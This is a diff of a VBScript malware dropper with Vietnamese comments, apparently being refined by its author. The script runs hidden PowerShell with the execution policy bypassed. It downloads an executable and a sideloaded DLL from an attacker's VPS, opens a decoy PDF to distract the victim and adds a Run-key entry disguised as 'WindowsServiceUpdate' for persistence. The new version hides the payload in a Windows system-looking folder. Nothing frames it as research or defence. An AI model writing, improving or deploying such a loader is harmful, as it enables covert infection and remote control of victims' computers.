@@ -1,17 +1,27 @@
 Set WshShell = CreateObject("WScript.Shell")
+strAppData = WshShell.ExpandEnvironmentStrings("%APPDATA%")
 strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
+
+' Cấu hình IP VPS của bạn
 IP = "IP_VPS_CUA_BAN"
 
-' Script PowerShell: Tải -> Mở khóa -> Chạy đúng vị trí
-' Dùng Unblock-File để Windows cho phép EXE nạp DLL
-psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
-"""$t=$env:TEMP; " & _
-"iwr 'http://" & IP & "/app.exe' -OutF '$t\app.exe'; " & _
-"iwr 'http://" & IP & "/vinh.dll' -OutF '$t\vinh.dll'; " & _
-"iwr 'http://" & IP & "/decoy.pdf' -OutF '$t\decoy.pdf'; " & _
-"Unblock-File -Path '$t\app.exe'; Unblock-File -Path '$t\vinh.dll'; " & _
-"Start-Process '$t\decoy.pdf'; " & _
-"Start-Process -FilePath '$t\app.exe' -WorkingDirectory '$t'; " & _
-"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsGraphics' -Value '$t\app.exe' -PropertyType 'String' -Force"""
+' Thư mục đích an toàn để lưu Payload (Microsoft\Windows là nơi rất kín)
+targetDir = strAppData & "\Microsoft\Windows"
+exePath = targetDir & "\win_update.exe"
+dllPath = targetDir & "\vinh.dll"
+pdfPath = strTemp & "\document.pdf"
 
+' Script PowerShell thực hiện nhiệm vụ
+' WindowStyle Hidden (0) để ẩn hoàn toàn cửa sổ
+psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+"""If (!(Test-Path '" & targetDir & "')) { New-Item -Path '" & targetDir & "' -ItemType Directory }; " & _
+"iwr 'http://" & IP & "/app.exe' -OutF '" & exePath & "'; " & _
+"iwr 'http://" & IP & "/vinh.dll' -OutF '" & dllPath & "'; " & _
+"iwr 'http://" & IP & "/decoy.pdf' -OutF '" & pdfPath & "'; " & _
+"Unblock-File -Path '" & exePath & "'; Unblock-File -Path '" & dllPath & "'; " & _
+"Start-Process '" & pdfPath & "'; " & _
+"Start-Process -FilePath '" & exePath & "' -WorkingDirectory '" & targetDir & "'; " & _
+"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsServiceUpdate' -Value '" & exePath & "' -PropertyType 'String' -Force"""
+
+' Chạy lệnh PowerShell ngầm (0) và không đợi (False)
 WshShell.Run psCmd, 0, False
